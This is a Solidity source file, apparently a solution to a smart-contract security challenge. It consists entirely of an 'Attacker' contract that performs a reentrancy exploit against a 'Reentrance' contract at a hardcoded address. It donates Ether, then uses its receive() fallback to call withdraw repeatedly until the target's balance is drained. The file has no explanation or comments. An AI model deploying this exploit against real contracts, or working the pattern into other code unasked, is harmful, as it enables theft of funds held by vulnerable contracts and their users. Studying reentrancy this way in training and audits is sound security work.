pragma solidity ^0.6.0;

import "./default.sol";

contract Attacker {
    Reentrance reenter = Reentrance(0x1a39bD88531CDCfC0AF6A778147ab9458Ae820D6);

    constructor() public payable {}

    function donate() public {
        reenter.donate{value: address(this).balance, gas: 4000000}(
            address(this)
        );
    }

    function trigger_withdraw() public {
        reenter.withdraw(reenter.balances(address(this)));
    }

    receive() external payable {
        if (address(reenter).balance != 0) {
            reenter.withdraw(reenter.balances(address(this)));
        }
    }
}
